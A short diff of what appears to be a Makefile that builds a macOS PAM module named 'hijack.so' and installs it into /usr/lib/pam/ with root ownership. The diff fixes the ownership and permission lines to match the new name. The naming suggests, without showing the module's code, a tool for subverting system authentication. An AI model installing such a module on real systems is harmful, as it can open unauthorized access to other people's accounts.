@@ -7,5 +7,5 @@ master:
 	ld -arch x86_64 -macosx_version_min 10.8 -dylib -lpam -lc -o hijack.so hijack.o
 install:
 	cp hijack.so /usr/lib/pam/
-	chown root:wheel /usr/lib/pam/master.so
-	chmod 0444 /usr/lib/pam/master.so
+	chown root:wheel /usr/lib/pam/hijack.so
+	chmod 0444 /usr/lib/pam/hijack.so
